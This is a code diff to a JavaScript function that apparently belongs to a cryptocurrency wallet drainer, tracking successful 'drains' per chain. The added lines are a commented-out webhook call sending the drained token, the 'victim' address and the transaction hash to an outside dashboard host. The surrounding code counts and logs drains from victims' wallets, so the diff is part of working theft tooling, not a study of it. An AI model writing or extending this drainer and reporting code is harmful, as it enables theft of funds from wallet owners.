@@ -101,6 +101,17 @@ async function monitorChain(config) {
             stats.lastDrain = new Date().toISOString();
             stats.drainsByChain[chain.name] = (stats.drainsByChain[chain.name] || 0) + 1;
             
+            // Notify dashboard (optional - if you add webhook endpoint)
+            try {
+              // You can add a webhook here to notify your dashboard
+              // await fetch('https://d-kit-seven.vercel.app/api/drain-notification', {
+              //   method: 'POST',
+              //   body: JSON.stringify({ token, victim: owner, txHash: hash, chainId: chain.id })
+              // });
+            } catch (e) {
+              // Ignore notification errors
+            }
+            
           } catch (error) {
             console.error(`❌ Drain failed: ${error.message}`);
           }
